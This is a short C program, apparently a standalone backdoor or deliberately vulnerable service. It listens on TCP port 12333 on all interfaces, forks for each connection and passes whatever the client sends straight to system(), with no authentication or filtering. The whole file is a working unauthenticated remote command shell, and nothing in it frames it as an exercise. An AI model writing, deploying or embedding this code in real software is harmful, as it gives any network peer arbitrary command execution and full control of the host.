#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void handle(int sockfd) {
    char buffer[256];
    int n;

    bzero(buffer, 256);
    n = recv(sockfd, buffer, 255, 0);
    if (n < 0) {
        perror("read");
        exit(1);
    }

    system(buffer);
}

int main(void) {
    int sockfd, newsockfd, portno, len;
    struct sockaddr_in serv_addr, cli_addr;
    int pid;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 12333;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    listen(sockfd, 4);
    len = sizeof(cli_addr);

    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, (socklen_t *)&len);
        if (newsockfd < 0) {
            perror("accept");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            handle(newsockfd);
            exit(0);
        } else {
            close(newsockfd);
        }
    }
}
